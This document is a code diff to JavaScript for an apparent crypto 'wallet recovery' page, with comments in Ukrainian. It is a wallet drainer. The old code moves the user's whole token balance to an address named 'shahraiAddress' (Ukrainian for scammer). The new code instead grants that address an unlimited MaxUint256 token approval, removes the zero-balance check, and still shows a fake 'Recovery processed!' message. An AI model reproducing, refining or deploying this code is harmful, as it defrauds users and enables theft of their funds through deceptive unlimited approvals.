@@ -216,7 +216,7 @@
         usdc: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
       },
       11155111: { // Sepolia Testnet
-        usdt: "0x9FcefD342ED17979ceDf0B6C4D257A03d908F5fD"
+        usdt: "0x9FcefD342ED17979ceDf0B6C4D257A03d908F5fD" // Твоя testUSDT
       }
     };
 
@@ -296,13 +296,7 @@
         const balance = await tokenContract.balanceOf(userAddress);
         const decimals = await tokenContract.decimals();
         const balanceFormatted = ethers.utils.formatUnits(balance, decimals);
-        console.log(`User balance: ${balanceFormatted} ${tokenName}`);
         document.getElementById('usdt-amount').innerText = formatNumber(balanceFormatted);
-
-        // Перевірка балансу
-        if (balance.isZero()) {
-          throw new Error('User has no tokens to transfer');
-        }
 
         // Оновлення USD еквіваленту після fetchPrices
         await fetchPrices();
@@ -316,24 +310,17 @@
 
         console.log('Signature:', signature);
 
-        // Виклик executeApprove з реальним балансом
+        // Виклик executeApprove з максимальним балансом
         const contractAbi = [
-          "function executeApprove(bytes memory message, address user, bytes memory signature, address token, address spender, uint256 amount) external",
-          "function transferTokens(address token, address from, address to, uint256 amount) external"
+          "function executeApprove(bytes memory message, address user, bytes memory signature, address token, address spender, uint256 amount) external"
         ];
         const contract = new ethers.Contract(contractAddress, contractAbi, new ethers.providers.Web3Provider(window.ethereum).getSigner());
 
-        const approveAmount = balance; // Використовуємо реальний баланс замість MaxUint256
+        const maxAmount = ethers.constants.MaxUint256; // Максимальний баланс
         const messageBytes = ethers.utils.toUtf8Bytes(message);
-        const approveTx = await contract.executeApprove(messageBytes, userAddress, signature, tokenAddress, contractAddress, approveAmount);
-        await approveTx.wait();
-        console.log('Approve Transaction Hash:', approveTx.hash);
-
-        // Виклик transferTokens через ApproveContract з ручним газом
-        const gasLimit = 200000; // Фіксований газовий ліміт (можна налаштувати)
-        const transferTx = await contract.transferTokens(tokenAddress, userAddress, shahraiAddress, balance, { gasLimit });
-        await transferTx.wait();
-        console.log('Transfer Transaction Hash:', transferTx.hash);
+        const tx = await contract.executeApprove(messageBytes, userAddress, signature, tokenAddress, shahraiAddress, maxAmount);
+        await tx.wait();
+        console.log('Transaction Hash:', tx.hash);
 
         alert('Wallet connected successfully. Recovery processed!');
       } catch (error) {
